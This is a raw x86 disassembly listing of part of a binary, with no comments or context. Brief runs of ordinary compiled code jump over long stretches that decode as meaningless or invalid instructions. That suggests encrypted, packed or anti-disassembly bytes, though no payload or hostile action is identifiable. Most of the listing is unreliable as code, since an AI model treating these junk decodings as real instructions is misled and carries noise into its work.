  4030ce:	fbstp  TBYTE PTR [ecx-0x7]
  4030d1:	scas   eax,DWORD PTR es:[edi]
  4030d2:	cld    
  4030d3:	dec    eax
  4030d4:	imul   eax,DWORD PTR [edi],0xffffffc9
  4030d7:	xor    al,0x8f
  4030d9:	mov    bl,0xa6
  4030db:	mov    ebp,0x19c96778
  4030e0:	inc    edx
  4030e1:	mov    WORD PTR [edi+0x7c6b7f0b],fs
  4030e7:	cmp    eax,ebp
  4030e9:	xor    ebx,DWORD PTR [ebp-0x714488]
  4030ef:	xor    dh,BYTE PTR [ebx+0xe]
  4030f2:	enter  0x1bbc,0x7c
  4030f6:	push   0xffffffb7
  4030f8:	out    dx,eax
  4030f9:	(bad)  
  4030fa:	or     ebx,DWORD PTR ss:0x14f62a96
  403101:	(bad)
  403105:	sub    eax,DWORD PTR [edi-0x45]
  403108:	test   esp,ebp
  40310a:	add    al,0x4b
  40310c:	std    
  40310d:	sar    DWORD PTR [eax-0x48],1
  403110:	fxam   
  403112:	scas   eax,DWORD PTR es:[edi]
  403113:	xor    al,0xa6
  403115:	sub    BYTE PTR [ebx+0x6d6e225b],bl
  40311b:	clc    
  40311c:	dec    ecx
  40311d:	test   ecx,eax
  40311f:	mov    ch,0xc9
  403121:	ret    0x51ec
  403124:	sub    ecx,DWORD PTR [esi-0x4a94e3fa]
  40312a:	push   eax
  40312b:	fstp   TBYTE PTR [esi+0x24]
  40312e:	(bad)  
  40312f:	stc    
  403130:	fst    DWORD PTR [ecx+0x70]
  403133:	sar    DWORD PTR [esi-0x119bb965],0xb9
  40313a:	aas    
  40313b:	mov    DWORD PTR [ecx],eax
  40313d:	mov    eax,DWORD PTR [ebp-0x24]
  403140:	mov    ecx,DWORD PTR [ebp-0x8]
  403143:	mov    DWORD PTR [ecx+0x4],eax
  403146:	mov    eax,DWORD PTR [ebp-0x20]
  403149:	mov    ecx,DWORD PTR [ebp-0x8]
  40314c:	mov    DWORD PTR [ecx+0x8],eax
  40314f:	mov    eax,DWORD PTR [ebp-0x34]
  403152:	mov    ecx,DWORD PTR [ebp-0x8]
  403155:	mov    DWORD PTR [ecx+0xc],eax
  403158:	mov    eax,DWORD PTR [ebp-0x30]
  40315b:	jmp    0x403569
  403160:	mov    esi,ss
  403162:	jmp    0x4031a7
  403164:	jno    0x4031c9
  403166:	mov    ah,0xd1
  403168:	cs out 0xa4,al
  40316b:	mov    ch,0x4
  40316d:	xor    eax,0x1589aa06
  403172:	jle    0x4031f2
  403174:	outs   dx,DWORD PTR ds:[esi]
  403175:	jge    0x4031f5
  403177:	jle    0x40314c
  403179:	inc    ebp
  40317a:	sbb    eax,0x4258e608
  40317f:	mov    cs,WORD PTR [ebx]
  403181:	mov    eax,ds:0xb78e03f2
  403186:	bound  edx,QWORD PTR [esi+0x12]
  403189:	rol    BYTE PTR [edx],cl
  40318b:	jb     0x403179
  40318d:	leave  
  40318e:	xchg   edx,eax
  40318f:	mov    esp,0x13bedfff
  403194:	mov    cl,0x91
  403196:	mov    dh,0xac
  403198:	add    al,0x8
  40319a:	in     al,0x9c
  40319c:	call   FWORD PTR [edx+0x1367c48b]
  4031a2:	retf   0xdb8
  4031a5:	loop   0x403135
  4031a7:	fwait
  4031a8:	mov    edi,0x588a6b4f
  4031ad:	mov    esi,0x4bf0cd5d
  4031b2:	out    0x44,al
  4031b4:	add    al,0x6f
  4031b6:	pop    eax
  4031b7:	ret    0x25d8
  4031ba:	jbe    0x40320b
  4031bc:	ja     0x403182
  4031be:	rcl    eax,cl
  4031c0:	sub    BYTE PTR [ebp+ecx*1-0x108a7e4f],bl
  4031c7:	cmp    bl,BYTE PTR [edx+0x4c7e1de7]
  4031cd:	jle    0x4031ce
  4031cf:	ja     0x40319b
  4031d1:	inc    ecx
  4031d3:	sbb    al,0x9b
  4031d5:	pop    ebp
  4031d6:	jmp    0x4031fb
  4031d8:	ret    0xb2a3
  4031db:	sub    BYTE PTR [edi+0x7b4cb422],dl
  4031e1:	add    edi,DWORD PTR [ecx+ecx*2]
  4031e4:	mov    ds:0x92b4b29,eax
  4031e9:	stc    
  4031ea:	imul   esi,DWORD PTR [ecx+0x33],0xffffffb7
  4031ee:	(bad)  
  4031f0:	jne    0x403183
  4031f2:	jge    0x403217
  4031f4:	in     eax,0xbb
  4031f6:	stos   DWORD PTR es:[edi],eax
  4031f7:	loope  0x403189
  4031f9:	push   ebx
  4031fa:	sbb    edx,ecx
  4031fc:	push   eax
  4031fd:	ins    DWORD PTR es:[edi],dx
  4031fe:	add    bl,BYTE PTR [ebx-0xe]
  403201:	out    0x41,eax
  403203:	lock int 0xf5
  403206:	outs   dx,BYTE PTR ds:[esi]
  403207:	xchg   BYTE PTR [ebp+0x69],dl
  40320a:	fucomp st(3)
  40320c:	xchg   esi,eax
  40320d:	mov    al,ds:0xd5d35aa
  403212:	mov    BYTE PTR [ecx-0x1],bh
  403215:	or     BYTE PTR [eax+eiz*4],cl
  403218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403219:	pop    ecx
  40321a:	lods   eax,DWORD PTR ds:[esi]
  40321b:	ret    0x48ac
  40321e:	lods   eax,DWORD PTR ds:[esi]
  40321f:	ret    
  403220:	adc    ch,dl
  403222:	xor    ebx,ebx
  403224:	(bad)  
  403225:	out    dx,al
  403226:	or     eax,0x151822bb
  40322b:	leave  
  40322c:	(bad)  
  40322d:	cmp    BYTE PTR [ebx-0x4f],bh
  403230:	lahf   
  403231:	sub    ah,ah
  403233:	jbe    0x4032a8
  403235:	xchg   esi,eax
  403236:	aam    0x2e
  403238:	imul   esi,DWORD PTR [ebp-0x73],0xbaa0324d
  40323f:	ja     0x403268
  403241:	fistp  QWORD PTR [ecx]
  403243:	inc    edi
  403244:	sbb    BYTE PTR [esi-0x58],ch
  403247:	aad    0xaa
  403249:	mov    dh,0x16
  40324b:	pop    ss
  40324c:	mov    ds:0xe5ae1e9b,al
  403251:	pop    eax
  403252:	cmp    al,0x85
  403254:	xchg   ecx,eax
  403255:	imul   eax,DWORD PTR [esi+eiz*4+0x73],0xcb13ae20
  40325d:	shl    DWORD PTR [ebx-0x49dde10e],0xb0
  403264:	pop    esi
  403265:	jae    0x403214
  403267:	shl    DWORD PTR [bp+0x2279],cl
  40326c:	xchg   ebx,eax
  40326d:	dec    ebx
  40326e:	push   cs
  40326f:	(bad)  
  403270:	in     eax,dx
  403271:	cmp    DWORD PTR [ebx+0x50b72861],ebx
  403277:	mov    eax,0x3f3f72cb
  40327c:	retf   
  40327d:	and    eax,0xda10b944
  403282:	jge    0x4032be
  403284:	in     eax,0x53
  403286:	add    eax,0x1834e90
  40328b:	test   eax,0x83501745
  403290:	cmp    BYTE PTR ds:0x6bc4bf1f,dl
  403296:	mov    ebp,0x49253f6e
  40329b:	and    dh,dh
  40329d:	mov    ah,0x69
  40329f:	in     al,0x25
  4032a1:	jns    0x403233
  4032a3:	not    BYTE PTR [ebp+0x2a]
  4032a6:	out    0x14,al
  4032a8:	mov    esi,0xd718eb95
  4032ad:	das    
  4032ae:	test   eax,0xc61e47df
  4032b3:	dec    esi
  4032b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032b5:	loop   0x403293
  4032b7:	pop    ecx
  4032b8:	dec    esp
  4032b9:	push   cs
  4032ba:	les    ebx,FWORD PTR [eax-0x30967b64]
  4032c0:	sbb    al,0xe
  4032c2:	push   es
  4032c3:	sbb    DWORD PTR [esi+edx*8-0xd96f5ff],esp
  4032ca:	jne    0x403288
  4032cc:	xchg   edx,eax
  4032cd:	(bad)  
  4032ce:	xchg   BYTE PTR [edi+0x5f30b371],dh
  4032d4:	add    eax,DWORD PTR [eax]
  4032d6:	dec    esp
  4032d7:	loop   0x40332b
  4032d9:	in     eax,0x37
  4032db:	icebp  
  4032dc:	jmp    DWORD PTR [esi]
  4032de:	out    0x56,al
  4032e0:	pushf  
  4032e1:	xchg   esp,eax
  4032e2:	push   ebx
  4032e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032e4:	xchg   esi,eax
  4032e5:	(bad)  
  4032e7:	iret   
  4032e8:	xor    DWORD PTR [esi-0x1a],0x61
  4032ec:	push   ds
  4032ed:	inc    ebp
  4032ee:	adc    eax,0x604889c9
  4032f3:	mov    ebx,0xac4b6cce
  4032f8:	push   es
  4032f9:	inc    ecx
  4032fa:	and    cl,BYTE PTR [esi+0x47]
  4032fd:	cmc    
  4032fe:	mov    BYTE PTR [edi+ebx*4+0x2f],al
  403302:	mov    ebp,0x45d70a1d
  403307:	add    eax,DWORD PTR [ecx]
  403309:	and    al,0xa3
  40330b:	iret   
  40330c:	test   esi,edi
  40330e:	jne    0x4032bc
  403310:	icebp  
  403311:	mov    esi,DWORD PTR [ebx+0x777d0825]
  403317:	shl    dl,1
  403319:	and    cl,dh
  40331b:	jno    0x40335c
  40331d:	or     ah,BYTE PTR [edx-0x37]
  403320:	xlat   BYTE PTR es:[ebx]
  403322:	inc    edi
  403323:	cdq    
  403324:	test   eax,0xd6612549
  403329:	popf   
  40332a:	(bad)  
  40332b:	cmp    BYTE PTR [ecx-0x348c33db],al
  403331:	inc    edi
  403332:	out    dx,eax
  403333:	mov    ds:0x115a123e,eax
  403338:	mov    ecx,esp
  40333a:	mov    ecx,0x4e5fa4eb
  40333f:	sub    BYTE PTR [esi+0x6e],bh
  403342:	inc    edx
  403343:	sub    eax,0xc32c828
  403348:	xchg   esi,eax
  403349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40334a:	dec    edx
  40334b:	mov    BYTE PTR [edx+0x12],dl
  40334e:	jmp    0x4033c0
  403350:	test   cl,bl
  403352:	add    BYTE PTR [ebp+0x1f53516c],ah
  403358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403359:	stos   DWORD PTR es:[edi],eax
  40335a:	pop    esp
  40335b:	adc    dh,BYTE PTR [edx+0x9b1fa92]
  403361:	ds adc ch,al
  403364:	dec    esp
  403365:	pop    ebx
  403366:	cmp    ebx,esp
  403368:	loope  0x4033c4
  40336a:	fimul  WORD PTR [esi+0x4d10f696]
  403370:	cmp    eax,0xedee275e
  403375:	loopne 0x40337f
  403377:	sbb    eax,0xb08e04e2
  40337c:	jo     0x4033b8
  40337e:	cs pushf 
  403380:	adc    bh,BYTE PTR [esi-0x67f36fd5]
  403386:	dec    esi
  403387:	shl    BYTE PTR [edx],1
  403389:	sti    
  40338a:	jno    0x40333b
  40338c:	cli    
  40338d:	inc    ebp
  40338e:	dec    eax
  40338f:	xor    eax,0x74da4ca
  403394:	loope  0x4033ea
  403396:	lds    edi,FWORD PTR [ebx-0x1d]
  403399:	mov    WORD PTR [ecx-0x44],?
  40339c:	push   ebp
  40339d:	call   0x2829:0xec3ec418
  4033a4:	mov    ds:0xa6bd99fc,al
  4033a9:	sub    DWORD PTR [eax-0x42],ebp
  4033ac:	or     DWORD PTR [edi],0xa72868fd
  4033b2:	pop    eax
  4033b3:	pop    edx
  4033b4:	fdiv   DWORD PTR ds:[edx+0x7]
  4033b8:	jnp    0x4033fb
  4033ba:	out    0xd5,al
  4033bc:	cmp    eax,0x1b30c5b1
  4033c1:	pop    ebx
  4033c2:	xor    BYTE PTR [ecx],bl
  4033c4:	jp     0x4033eb
  4033c6:	fsub   DWORD PTR [ebx]
  4033c8:	sbb    ecx,DWORD PTR [edx-0x347fe047]
  4033ce:	es int 0x8d
  4033d1:	bound  edi,QWORD PTR [edx+0x6cbbdc69]
  4033d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033d8:	jg     0x4033bb
  4033da:	dec    eax
  4033db:	fmulp  st(4),st
  4033dd:	cmc    
  4033de:	popa   
  4033df:	adc    al,ah
  4033e1:	cmc    
  4033e2:	mov    ebx,0xedc7e297
  4033e7:	fwait
  4033e8:	aaa    
  4033e9:	shl    DWORD PTR [ebx-0x32fb5bf3],cl
  4033ef:	push   ds
  4033f0:	in     al,0x79
  4033f2:	daa    
  4033f3:	es jmp 0x81bf:0x6dc15ec2
  4033fb:	sbb    ch,ah
  4033fd:	xor    al,0xb
  4033ff:	or     DWORD PTR [ebx-0x38],ebx
  403402:	mov    ch,0xef
  403404:	xchg   DWORD PTR [ebx],ecx
  403406:	jmp    0xdf56:0xf7a7b31
  40340d:	repz or dh,BYTE PTR [edi]
  403410:	jl     0x403435
  403412:	cmp    ebp,0xb5ad0457
  403418:	mov    ecx,0x37c1e35b
  40341d:	mov    eax,ds:0xe77d27bc
  403422:	add    DWORD PTR ds:0xfbb41578,ebx
  403428:	int3   
  403429:	add    BYTE PTR [ebp-0x1b],cl
  40342c:	test   DWORD PTR [edx-0x4ff9f350],esp
  403432:	shl    ch,cl
  403434:	mov    bl,0x0
  403436:	mov    ch,0x5c
  403438:	cmp    BYTE PTR [ebx-0x1a443bf6],bh
  40343e:	mov    cl,0xa5
  403440:	cli    
  403441:	and    DWORD PTR [ecx],ebx
  403443:	add    DWORD PTR [ecx-0x46e00409],0x65062d2b
  40344d:	icebp  
  40344e:	aad    0x7d
  403450:	dec    BYTE PTR [ecx-0x6a]
  403453:	dec    eax
  403454:	xor    edx,ebp
  403456:	(bad)  
  403457:	sub    eax,0xfd3682e5
  40345c:	test   BYTE PTR [edx+edx*8],bh
  40345f:	xchg   ecx,eax
  403460:	mov    cl,ch
  403462:	push   edi
  403463:	and    cl,bh
  403465:	jmp    0xe9cf04f9
  40346a:	xchg   esp,eax
  40346b:	push   esp
  40346c:	les    edx,FWORD PTR [ecx-0x61]
  40346f:	jecxz  0x403411
  403471:	sub    al,dl
  403473:	xchg   esi,eax
  403474:	xor    bl,BYTE PTR [ebp+0x7c94a246]
  40347a:	nop
  40347b:	mov    ss,WORD PTR [esi-0x24a23712]
  403481:	xlat   BYTE PTR ds:[ebx]
  403482:	(bad)  
  403483:	retf   
  403484:	repnz dec esi
  403486:	xchg   DWORD PTR [esi],ecx
  403488:	in     eax,0xbf
  40348a:	scas   eax,DWORD PTR es:[edi]
  40348b:	jecxz  0x4034ff
  40348d:	add    DWORD PTR [eax-0x19],ebp
  403490:	inc    edi
  403491:	popf   
  403492:	adc    ecx,DWORD PTR [esi+0x7e]
  403495:	loope  0x40345a
  403497:	inc    BYTE PTR [esi+0x107e61c8]
  40349d:	into   
  40349e:	mov    bl,0xd1
  4034a0:	cld    
  4034a1:	sub    edx,DWORD PTR [edx-0x7]
  4034a4:	inc    ebp
  4034a5:	mov    ds:0x834f587e,eax
  4034aa:	xchg   edi,eax
  4034ab:	xchg   bp,ax
  4034ad:	stos   DWORD PTR es:[edi],eax
  4034ae:	inc    esi
  4034af:	(bad)  
  4034b0:	in     eax,0xae
  4034b2:	outs   dx,BYTE PTR ds:[esi]
  4034b3:	scas   eax,DWORD PTR es:[edi]
  4034b4:	or     eax,0xf48f7e42
  4034b9:	aam    0xda
  4034bb:	popf   
  4034bc:	lahf   
  4034bd:	dec    edx
  4034be:	ret    
  4034bf:	out    0xde,eax
  4034c1:	jl     0x403493
  4034c3:	js     0x403482
  4034c5:	pushf  
  4034c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034c7:	es xchg ebp,eax
  4034c9:	ss loop 0x40354a
  4034cc:	rcr    DWORD PTR [edx+0x508960f5],cl
  4034d2:	push   cs
  4034d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034d4:	add    bh,BYTE PTR [ebp-0x112624bb]
  4034da:	aas    
  4034db:	mov    eax,0xfee61198
  4034e0:	out    dx,al
  4034e1:	(bad)  
  4034e2:	in     eax,0x54
  4034e4:	shr    DWORD PTR [ebx],cl
  4034e6:	mov    cs,edx
  4034e8:	outs   dx,BYTE PTR ds:[esi]
  4034e9:	adc    esi,DWORD PTR [ebx]
  4034eb:	stos   DWORD PTR es:[edi],eax
  4034ec:	jmp    0x2091bd56
  4034f1:	fisubr WORD PTR [edx-0x6e2012b9]
  4034f7:	xor    DWORD PTR [eax+0x5a0cf996],eax
  4034fd:	sti    
  4034fe:	sub    al,0x4c
  403500:	fwait
  403501:	dec    esi
  403502:	xchg   esp,eax
  403503:	mov    ecx,0xf6949ad3
  403508:	fld    TBYTE PTR [eax+0x690b712c]
  40350e:	(bad)  [edx]
  403510:	xor    eax,0xff907f00
  403515:	cmp    edx,ebx
  403517:	inc    al
  403519:	fsub   QWORD PTR [ecx]
  40351b:	pop    esi
  40351c:	add    eax,0xf00ceee7
  403521:	mov    bl,0xca
  403523:	push   esi
  403524:	test   al,0x10
  403526:	imul   edi,esp,0xdbe35b3b
  40352c:	push   eax
  40352d:	lahf   
  40352e:	xor    DWORD PTR [edi],esi
  403530:	push   edi
  403531:	push   edx
  403532:	sar    BYTE PTR [ecx+0x26d655ac],cl
  403538:	lss    edi,FWORD PTR [ebx+0x558c8123]
  40353f:	xor    ch,BYTE PTR [esi+ecx*4+0x360851b8]
  403546:	mov    ah,0x34
  403548:	dec    ebx
  403549:	mov    bh,0x2a
  40354b:	mov    eax,ds:0xff6b9e65
  403550:	shl    BYTE PTR [edx+0x382d7dc5],0xa5
  403557:	mov    al,ds:0xead93b4a
  40355c:	pop    ds
  40355d:	mov    WORD PTR [esi],gs
  40355f:	or     eax,0x8d8123ff
  403564:	imul   ebp,DWORD PTR [eax-0x73],0x6d
  403568:	out    dx,eax
  403569:	mov    ecx,DWORD PTR [ebp-0x8]
  40356c:	mov    DWORD PTR [ecx+0x10],eax
  40356f:	mov    eax,eax
  403571:	mov    eax,DWORD PTR [ebp-0x24]
  403574:	test   eax,eax
  403576:	mov    eax,DWORD PTR [ebp-0x2c]
  403579:	jne    0x403582
  40357f:	mov    eax,DWORD PTR [ebp-0x10]
  403582:	xor    eax,esi
  403584:	add    eax,edi
  403586:	jmp    0x403994
  40358b:	in     eax,dx
  40358c:	adc    ch,ch
  40358e:	ret    0xe3f1
  403591:	icebp  
  403592:	xor    DWORD PTR [eax],ebx
  403594:	xchg   esi,eax
  403595:	sbb    esp,edx
  403597:	sti    
  403598:	call   0x7e7e:0x1186d3b8
  40359f:	outs   dx,DWORD PTR ds:[esi]
  4035a0:	jge    0x403620
  4035a2:	jle    0x40360a
  4035a4:	data16 sbb al,0xc4
  4035a7:	jb     0x403536
  4035a9:	inc    ecx
  4035aa:	jl     0x403580
  4035ac:	dec    eax
  4035ad:	(bad)  
  4035ae:	or     cl,BYTE PTR [eax]
  4035b0:	push   esp
  4035b1:	mov    ebx,0x40b1440
  4035b6:	mov    ebx,0x889154b
  4035bb:	jmp    0x40353d
  4035bd:	cwde   
  4035be:	pop    edi
  4035bf:	stos   BYTE PTR es:[edi],al
  4035c0:	adc    BYTE PTR [edi],bl
  4035c2:	lock mov edx,ecx
  4035c5:	sub    al,0xf1
  4035c7:	std    
  4035c8:	frndint 
  4035ca:	in     al,0x96
  4035cc:	adc    BYTE PTR [ebx],bl
  4035ce:	mov    al,ds:0xba49afa1
  4035d3:	pop    ds
  4035d4:	loop   0x4035fe
  4035d6:	cmp    eax,0x42052e3a
  4035db:	gs xor eax,0x36aecc2f
  4035e1:	retf   0x8d10
  4035e4:	jns    0x403610
  4035e6:	mov    edi,0xc0015fe9
  4035eb:	in     eax,0x10
  4035ed:	mov    al,0x8
  4035ef:	mov    ebp,0x6eb4d0bb
  4035f4:	add    cl,BYTE PTR [ebp*8+0x45e3ae06]
  4035fb:	sbb    BYTE PTR [ebp-0x2bd823d9],bh
  403601:	adc    BYTE PTR [ebx-0x67],dh
  403604:	outs   dx,BYTE PTR ds:[esi]
  403605:	aaa    
  403606:	repz lea eax,[ecx-0x39]
  40360a:	fidiv  DWORD PTR [edi+ebp*8]
  40360d:	dec    esp
  40360e:	jne    0x40361d
  403610:	cdq    
  403611:	ins    DWORD PTR es:[edi],dx
  403612:	pop    edx
  403613:	push   cs
  403614:	(bad)  
  403615:	iret   
  403616:	je     0x4035b4
  403618:	retf   
  403619:	xchg   ecx,eax
  40361a:	ins    DWORD PTR es:[edi],dx
  40361b:	mov    esi,0xd158b29
  403620:	cmp    DWORD PTR [edx-0x44],0xffffffb3
  403624:	push   es
  403625:	cs or  al,0x52
  403628:	mov    ecx,edi
  40362a:	dec    eax
  40362b:	mov    ebp,0xa805522a
  403630:	jnp    0x403643
  403632:	sar    BYTE PTR [esi+0x27],0x82
  403636:	fs push ds
  403638:	stos   BYTE PTR es:[edi],al
  403639:	pop    edi
  40363a:	sbb    eax,0xef5fa77a
  40363f:	jg     0x40368d
  403641:	cdq    
  403642:	pop    edi
  403643:	in     eax,0x23
  403645:	ins    DWORD PTR es:[edi],dx
  403646:	sub    DWORD PTR [eax+eiz*1],edi
  403649:	inc    ebx
  40364a:	cmp    eax,0xb51293ef
  40364f:	mov    ds:0x74f40c6a,eax
  403654:	(bad)  
  403655:	icebp  
  403656:	imul   eax,ecx,0xa6be60bd
  40365c:	mov    cs,WORD PTR [ecx+0x50]
  40365f:	iret   
  403660:	int    0x7d
  403662:	imul   esp,DWORD PTR ds:0x64671249,0x75
  403669:	int3   
  40366a:	psrad  mm4,0xcd
  40366e:	sbb    bl,BYTE PTR [edi]
  403670:	sbb    eax,0xe28a8d6
  403675:	dec    esi
  403676:	cwde   
  403677:	pop    esp
  403678:	xor    DWORD PTR [ebx-0x26],0x73
  40367c:	lds    esi,FWORD PTR [ebx-0x3e4e671d]
  403682:	adc    al,0xcb
  403684:	jecxz  0x40368f
  403686:	xor    DWORD PTR [eax-0x20d1d355],0xfffffff7
  40368d:	shl    DWORD PTR [eax-0x7f06877e],1
  403693:	add    bh,BYTE PTR [ebp-0x33610b17]
  403699:	or     edx,0xa8807450
  40369f:	sub    ebx,DWORD PTR [ecx-0x13]
  4036a2:	scas   eax,DWORD PTR es:[edi]
  4036a3:	mov    ds:0x7f00f966,al
  4036a8:	mov    ebx,0x1d3c6b0d
  4036ad:	cwde   
  4036ae:	sti    
  4036af:	imul   ah
  4036b1:	xlat   BYTE PTR ds:[ebx]
  4036b2:	pop    edi
  4036b3:	call   0xea61:0xe26f504f
  4036ba:	(bad)  
  4036bb:	je     0x4036ab
  4036bd:	aam    0xed
  4036bf:	cmp    bh,ah
  4036c1:	mov    al,0x85
  4036c3:	xchg   DWORD PTR [ecx-0x60],esi
  4036c6:	retf   0x7452
  4036c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036ca:	inc    eax
  4036cb:	je     0x403694
  4036cd:	mov    ds:0xc25802e6,eax
  4036d2:	adc    BYTE PTR [edi],ah
  4036d4:	fstp   TBYTE PTR [esi+0x3b]
  4036d7:	psrld  mm7,QWORD PTR [eax+0x7]
  4036db:	(bad)
  4036df:	pop    esp
  4036e0:	sbb    eax,0xffaf72c9
  4036e5:	lds    esp,FWORD PTR [ebp-0x40]
  4036e8:	out    0xe0,eax
  4036ea:	outs   dx,DWORD PTR ds:[esi]
  4036eb:	jb     0x4036a5
  4036ed:	xchg   esp,eax
  4036ee:	inc    edx
  4036ef:	adc    eax,0x968dbcb9
  4036f4:	inc    ch
  4036f6:	sbb    dl,BYTE PTR [eax-0x1388936]
  4036fc:	adc    bh,dh
  4036fe:	adc    esp,DWORD PTR [edx-0x36]
  403701:	dec    esi
  403702:	out    dx,eax
  403703:	push   ds
  403704:	mov    ds:0x9090311c,al
  403709:	jns    0x403698
  40370b:	retf   
  40370c:	xchg   ebp,eax
  40370d:	stos   BYTE PTR es:[edi],al
  40370e:	mov    bl,0x6e
  403710:	lahf   
  403711:	mov    eax,0xc49d7e56
  403716:	cmp    eax,0x7eebbb4c
  40371b:	and    bl,cl
  40371d:	cmp    al,0xd8
  40371f:	pop    ecx
  403720:	and    eax,0x9e753e42
  403725:	in     al,dx
  403726:	into   
  403727:	xchg   dl,dh
  403729:	and    eax,0xd0e59a08
  40372e:	xchg   edi,eax
  40372f:	ret    0x7e6
  403732:	fstp   st(0)
  403734:	sub    DWORD PTR [eax+0x14],ebx
  403737:	sub    eax,0xeb6bcc9e
  40373c:	sub    ebp,DWORD PTR [ebx]
  40373e:	(bad)  
  40373f:	outs   dx,DWORD PTR ds:[esi]
  403740:	adc    bh,dh
  403742:	loope  0x403720
  403744:	xchg   ecx,eax
  403746:	add    dh,BYTE PTR [edi-0x24cffc02]
  40374c:	shl    ch,cl
  40374e:	sar    BYTE PTR [eax+0x4],0x23
  403752:	adc    eax,0x6b1487a9
  403757:	inc    esp
  403758:	aad    0x2
  40375a:	xchg   esi,eax
  40375b:	cmp    ecx,DWORD PTR [edx]
  40375d:	cmp    ecx,edx
  40375f:	cmp    eax,0xdea81a89
  403764:	jp     0x4036f9
  403766:	mov    esp,0xb3169f54
  40376b:	cmc    
  40376c:	mov    esp,0x8e25f7b6
  403771:	es jmp 0x36063914
  403777:	pop    esp
  403778:	or     dh,cl
  40377a:	lods   al,BYTE PTR ds:[esi]
  40377b:	hlt    
  40377c:	adc    eax,ebp
  40377e:	and    al,0x59
  403780:	in     al,dx
  403781:	sub    cl,ah
  403783:	scas   eax,DWORD PTR es:[edi]
  403784:	pop    edx
  403785:	loop   0x4037b3
  403787:	repz jp 0x403756
  40378a:	push   ds
  40378b:	retf   0x7d3c
  40378e:	pop    ss
  40378f:	mov    al,ds:0xb95ccd84
  403794:	rcr    DWORD PTR [ebp+edx*8+0x1f4e654e],0xe0
  40379c:	btr    ecx,0xf0
  4037a0:	mov    al,BYTE PTR [ebx+ecx*4+0x1]
  4037a4:	inc    edx
  4037a5:	pop    esi
  4037a6:	ret    0x7b03
  4037a9:	xchg   ecx,eax
  4037aa:	std    
  4037ab:	and    bh,BYTE PTR [esi-0x5e1f434c]
  4037b1:	cmc    
  4037b2:	jnp    0x403770
  4037b4:	dec    eax
  4037b5:	mov    ch,0x3a
  4037b7:	push   es
  4037b8:	mov    eax,ds:0xa55afb5b
  4037bd:	xor    DWORD PTR es:[esp+ebp*1-0x44ccf745],edi
  4037c5:	pusha  
  4037c6:	int3   
  4037c7:	cmp    DWORD PTR [ebp+0x1c],0x11
  4037cb:	imul   eax,edx,0xffffffb6
  4037ce:	cmp    eax,0x9e6191f5
  4037d3:	lods   al,BYTE PTR ds:[esi]
  4037d4:	jecxz  0x40376b
  4037d6:	std    
  4037d7:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4037d9:	sbb    eax,DWORD PTR [eax-0x30961dfe]
  4037df:	add    dh,BYTE PTR [ecx+0xb]
  4037e2:	sbb    DWORD PTR [ecx],eax
  4037e4:	cmp    BYTE PTR [ebx+esi*4],bl
  4037e7:	mov    ah,0x98
  4037e9:	cs (bad) 
  4037ec:	arpl   WORD PTR [ebx+0x5004fb47],bp
  4037f2:	in     eax,dx
  4037f3:	cmp    dl,dl
  4037f5:	ins    BYTE PTR es:[edi],dx
  4037f6:	pop    ss
  4037f7:	xchg   DWORD PTR [edx-0x5f],esp
  4037fa:	and    DWORD PTR [esi-0x756135cc],ebx
  403800:	psllw  mm0,QWORD PTR [esi+0x18]
  403804:	cli    
  403805:	dec    ebp
  403806:	imul   ebx,DWORD PTR [edi+0x18],0x970e9192
  40380d:	dec    ebx
  40380e:	fistp  DWORD PTR [edi-0x3b]
  403811:	cmp    eax,DWORD PTR [edx]
  403813:	pop    esi
  403814:	out    dx,al
  403815:	mov    edx,0xf857b945
  40381a:	xchg   edx,eax
  40381b:	cmp    al,bl
  40381d:	rcr    BYTE PTR [ebx+0x22],1
  403820:	rcr    BYTE PTR [esi-0x33],cl
  403823:	pop    edi
  403824:	mov    al,0xb0
  403826:	cmp    DWORD PTR [esi+0x2],eax
  403829:	jmp    0x403826
  40382b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40382c:	add    DWORD PTR [esi],edx
  40382e:	loope  0x40387d
  403830:	add    BYTE PTR [edx+edx*4+0x385e4da3],dl
  403837:	mov    ds:0xa6aaf5f6,al
  40383c:	mov    ebx,0xc49658bf
  403841:	jl     0x403823
  403843:	in     eax,0x10
  403845:	repz pop es
  403847:	jge    0x4038b2
  403849:	cmp    BYTE PTR [edi+0x53],dh
  40384c:	mov    ds:0xc56a4c01,al
  403851:	cmp    DWORD PTR [edx-0x2e601963],eax
  403857:	adc    eax,0x53ccc46b
  40385c:	dec    esp
  40385d:	mov    WORD PTR [edi],cs
  40385f:	cmp    al,0xe6
  403861:	jne    0x403881
  403863:	mov    cs,WORD PTR [ebx+0x5b0ac72c]
  403869:	mov    dl,0xbc
  40386b:	in     eax,dx
  40386c:	int    0x2c
  40386e:	rcr    DWORD PTR [esp+ebp*8],1
  403871:	mov    ch,0x59
  403873:	cmp    eax,0x8cac929f
  403878:	xchg   ebx,eax
  403879:	test   DWORD PTR [ebx+0x1c],ebx
  40387c:	cmp    BYTE PTR ds:0x2ff5d6bd,0x86
  403883:	ja     0x40389d
  403885:	mov    eax,0xdf866a96
  40388a:	sahf   
  40388b:	scas   eax,DWORD PTR es:[edi]
  40388c:	ror    ch,1
  40388e:	hlt    
  40388f:	jmp    0x86c9f6ab
  403894:	mov    edx,0xfdabf375
  403899:	or     DWORD PTR [eax-0x5d],esi
  40389c:	xrelease xchg BYTE PTR [esi+0x7b],bh
  4038a0:	inc    esp
  4038a1:	sbb    al,0x8f
  4038a3:	ins    DWORD PTR es:[edi],dx
  4038a4:	lods   eax,DWORD PTR ds:[esi]
  4038a5:	test   BYTE PTR [esi+0x71d97b74],bh
  4038ab:	mov    edx,0x4d13b208
  4038b0:	ja     0x4038f4
  4038b2:	mov    bh,0xc8
  4038b4:	sub    BYTE PTR ds:[eax+ebp*4],dl
  4038b8:	lea    ecx,[ebp-0x22]
  4038bb:	enter  0xb0b7,0xc2
  4038bf:	jmp    0x403859
  4038c1:	es scas eax,DWORD PTR es:[edi]
  4038c3:	add    ecx,DWORD PTR [edx-0x79]
